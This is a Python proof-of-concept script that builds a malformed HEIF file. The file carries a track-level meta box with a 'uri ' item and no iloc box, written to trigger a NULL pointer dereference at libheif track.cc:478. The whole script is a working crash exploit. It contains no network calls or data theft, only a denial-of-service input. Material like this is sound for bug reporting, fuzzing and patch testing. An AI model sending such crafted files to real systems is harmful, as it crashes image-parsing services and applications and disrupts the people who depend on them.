#!/usr/bin/env python3
"""
POC generator for NULL pointer dereference in libheif track.cc:478

Bug: When a trak box contains a meta box with an iinf item of type 'uri '
(with the specific URN "urn:uuid:15beb8e4-944d-5fc6-a3dd-cb5a7e655c73"),
the code fetches the iloc pointer but never null-checks it before calling
iloc->read_data(). If no iloc box is present, this causes a NULL deref.

File structure:
  ftyp (major=msf1, compatible=[msf1, isom])
  moov
    mvhd (version=0)
    trak
      tkhd (version=0)
      mdia
        mdhd (version=0)
        hdlr (handler_type='meta')
        minf
          nmhd
          stbl
            stsd (entry_count=1 -> urim sample entry)
            stts (entry_count=0)
            stsc (entry_count=1: first_chunk=1, samples_per_chunk=1, sdidx=1)
            stco (entry_count=0)
            stsz (fixed_size=0, sample_count=0)
      meta  <-- trak-level meta, triggers the vulnerable code path
        hdlr (handler_type='uri ')
        iinf (version=0, item_count=1)
          infe (version=2, item_ID=1, item_type='uri ',
                item_uri_type='urn:uuid:15beb8e4-944d-5fc6-a3dd-cb5a7e655c73')
        (NO iloc box -- this is what triggers the NULL deref)
"""

import struct
import sys

def fourcc(s):
    return s.encode('ascii') if isinstance(s, str) else s

def box(box_type, data):
    """Build a basic box: [size(4)] [type(4)] [data]"""
    t = fourcc(box_type) if len(box_type) == 4 else box_type[:4].encode()
    payload = bytes(data)
    size = 8 + len(payload)
    return struct.pack('>I4s', size, t) + payload

def fullbox(box_type, version, flags, data):
    """Build a FullBox: [size(4)] [type(4)] [version(1)] [flags(3)] [data]"""
    t = fourcc(box_type)
    payload = struct.pack('>B', version) + struct.pack('>I', flags)[1:4] + bytes(data)
    size = 8 + len(payload)
    return struct.pack('>I4s', size, t) + payload

def build_ftyp():
    """ftyp: major_brand=msf1, minor_version=0, compatible_brands=[msf1, isom]"""
    data  = b'msf1'          # major brand
    data += struct.pack('>I', 0)  # minor version
    data += b'msf1'          # compatible brand 1
    data += b'isom'          # compatible brand 2
    return box('ftyp', data)

def build_mvhd():
    """mvhd version=0:
    creation_time(4), modification_time(4), timescale(4), duration(4),
    rate(4), volume(2), reserved(2), reserved(8), matrix(36), pre_defined(24),
    next_track_ID(4)
    """
    data  = struct.pack('>IIII', 0, 0, 1000, 0)   # times, timescale, duration
    data += struct.pack('>I', 0x00010000)           # rate = 1.0
    data += struct.pack('>H', 0x0100)               # volume = 1.0
    data += struct.pack('>H', 0)                    # reserved
    data += struct.pack('>QQ', 0, 0)               # reserved (8 bytes each = 16 but spec says 8)
    # Actually mvhd: after volume+reserved(2), it's reserved[2]=8bytes, matrix=36bytes, pre_defined=24bytes
    # Let me recheck: rate(4) volume(2) reserved(2) reserved[2](8) matrix[9](36) pre_defined[6](24) next_track_ID(4)
    data = b''
    data += struct.pack('>IIII', 0, 0, 1000, 0)   # creation, modification, timescale, duration
    data += struct.pack('>I', 0x00010000)           # rate
    data += struct.pack('>H', 0x0100)               # volume
    data += struct.pack('>H', 0)                    # reserved
    data += b'\x00' * 8                             # reserved[2]
    # identity matrix: [0x00010000,0,0,0,0x00010000,0,0,0,0x40000000]
    matrix = [0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000]
    for m in matrix:
        data += struct.pack('>I', m)
    data += b'\x00' * 24                            # pre_defined[6]
    data += struct.pack('>I', 2)                    # next_track_ID
    return fullbox('mvhd', 0, 0, data)

def build_tkhd():
    """tkhd version=0:
    creation_time(4), modification_time(4), track_id(4), reserved(4), duration(4),
    reserved(8), layer(2), alternate_group(2), volume(2), reserved(2), matrix(36),
    width(4), height(4)
    """
    data  = struct.pack('>IIIII', 0, 0, 1, 0, 0)   # creation, modification, track_id, reserved, duration
    data += b'\x00' * 8                              # reserved
    data += struct.pack('>HHH', 0, 0, 0)            # layer, alternate_group, volume
    data += struct.pack('>H', 0)                     # reserved
    matrix = [0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000]
    for m in matrix:
        data += struct.pack('>I', m)
    data += struct.pack('>II', 0, 0)                # width, height
    return fullbox('tkhd', 0, 3, data)              # flags=3 (enabled + in movie)

def build_mdhd():
    """mdhd version=0:
    creation_time(4), modification_time(4), timescale(4), duration(4),
    language(2), pre_defined(2)
    """
    data  = struct.pack('>IIII', 0, 0, 1000, 0)
    # language 'und' = packed as: (('u'-0x60)<<10)|(('n'-0x60)<<5)|(('d'-0x60)<<0)
    # u=0x75-0x60=0x15, n=0x6e-0x60=0x0e, d=0x64-0x60=0x04
    lang = (0x15 << 10) | (0x0e << 5) | 0x04
    data += struct.pack('>HH', lang, 0)
    return fullbox('mdhd', 0, 0, data)

def build_hdlr(handler_type, name=b'\x00'):
    """hdlr: pre_defined(4), handler_type(4), reserved[3](12), name(string)"""
    data  = struct.pack('>I', 0)                    # pre_defined
    data += fourcc(handler_type)                    # handler_type
    data += b'\x00' * 12                            # reserved[3]
    data += name                                    # name (null-terminated string)
    return fullbox('hdlr', 0, 0, data)

def build_nmhd():
    """nmhd: Null Media Header (empty FullBox)"""
    return fullbox('nmhd', 0, 0, b'')

def build_urim_sample_entry():
    """urim SampleEntry: 6 reserved bytes + data_reference_index(2) + children
    We add a uri FullBox child with our URI type.
    """
    uri_string = b'urn:uuid:15beb8e4-944d-5fc6-a3dd-cb5a7e655c73\x00'
    uri_child = fullbox('uri ', 0, 0, uri_string)
    data  = b'\x00' * 6             # reserved
    data += struct.pack('>H', 1)    # data_reference_index
    data += uri_child
    return box('urim', data)

def build_stsd():
    """stsd: FullBox, entry_count(4), then sample entries"""
    urim = build_urim_sample_entry()
    data  = struct.pack('>I', 1)    # entry_count = 1
    data += urim
    return fullbox('stsd', 0, 0, data)

def build_stts_empty():
    """stts with 0 entries (no samples)"""
    data = struct.pack('>I', 0)     # entry_count = 0
    return fullbox('stts', 0, 0, data)

def build_stsc_one_entry():
    """stsc with 1 entry: first_chunk=1, samples_per_chunk=1, sample_description_index=1
    This is needed because stsc parse rejects entry_count=0.
    However since stco has 0 chunks, the chunk loop never runs so stsc is never used.
    """
    data  = struct.pack('>I', 1)                    # entry_count = 1
    data += struct.pack('>III', 1, 1, 1)            # first_chunk=1, spc=1, sdi=1
    return fullbox('stsc', 0, 0, data)

def build_stco_empty():
    """stco with 0 chunk offsets"""
    data = struct.pack('>I', 0)     # entry_count = 0
    return fullbox('stco', 0, 0, data)

def build_stsz_empty():
    """stsz with fixed_sample_size=0, sample_count=0"""
    data  = struct.pack('>I', 0)    # fixed_sample_size = 0
    data += struct.pack('>I', 0)    # sample_count = 0
    return fullbox('stsz', 0, 0, data)

def build_stbl():
    """stbl container with all required sample table boxes"""
    data  = build_stsd()
    data += build_stts_empty()
    data += build_stsc_one_entry()
    data += build_stco_empty()
    data += build_stsz_empty()
    return box('stbl', data)

def build_minf():
    """minf: nmhd + stbl"""
    data  = build_nmhd()
    data += build_stbl()
    return box('minf', data)

def build_mdia():
    """mdia: mdhd + hdlr(meta) + minf"""
    data  = build_mdhd()
    data += build_hdlr('meta')
    data += build_minf()
    return box('mdia', data)

def build_infe_uri():
    """infe version=2, item_ID=1, protection_index=0, item_type='uri ',
    item_name='', item_uri_type='urn:uuid:15beb8e4-944d-5fc6-a3dd-cb5a7e655c73'
    """
    uri_type = b'urn:uuid:15beb8e4-944d-5fc6-a3dd-cb5a7e655c73\x00'
    data  = struct.pack('>H', 1)    # item_ID (v2 = 2 bytes)
    data += struct.pack('>H', 0)    # item_protection_index
    data += b'uri '                 # item_type_4cc
    data += b'\x00'                 # item_name (empty null-terminated string)
    data += uri_type                # item_uri_type (null-terminated)
    return fullbox('infe', 2, 0, data)

def build_iinf():
    """iinf version=0, item_count=1, then one infe"""
    infe = build_infe_uri()
    data  = struct.pack('>H', 1)    # item_count (v0 = 2 bytes)
    data += infe
    return fullbox('iinf', 0, 0, data)

def build_trak_meta():
    """The trak-level meta box: hdlr + iinf (NO iloc -- this triggers the bug)"""
    data  = build_hdlr('uri ')      # handler_type for trak meta
    data += build_iinf()
    # Intentionally NO iloc box -- iloc pointer will be NULL at track.cc:466
    # and dereferenced at track.cc:478
    return fullbox('meta', 0, 0, data)

def build_trak():
    """trak: tkhd + mdia + meta(no-iloc)"""
    data  = build_tkhd()
    data += build_mdia()
    data += build_trak_meta()
    return box('trak', data)

def build_moov():
    """moov: mvhd + trak"""
    data  = build_mvhd()
    data += build_trak()
    return box('moov', data)

def build_poc():
    """Build the complete HEIF/ISOBMFF file"""
    data  = build_ftyp()
    data += build_moov()
    return data

if __name__ == '__main__':
    output = '/tmp/poc06.heif' if len(sys.argv) < 2 else sys.argv[1]
    payload = build_poc()
    with open(output, 'wb') as f:
        f.write(payload)
    print(f"[+] Written {len(payload)} bytes to {output}")
    print(f"[+] File structure:")
    print(f"    ftyp (major=msf1, compatible=[msf1,isom])")
    print(f"    moov")
    print(f"      mvhd")
    print(f"      trak")
    print(f"        tkhd")
    print(f"        mdia")
    print(f"          mdhd")
    print(f"          hdlr (handler=meta)")
    print(f"          minf > stbl > [stsd,stts,stsc,stco,stsz]")
    print(f"        meta (trak-level, NO iloc!)")
    print(f"          hdlr (handler=uri )")
    print(f"          iinf > infe(uri ,urn:uuid:15beb8e4-...)")
    print(f"[+] Expected crash: NULL deref at track.cc:478 (iloc->read_data)")
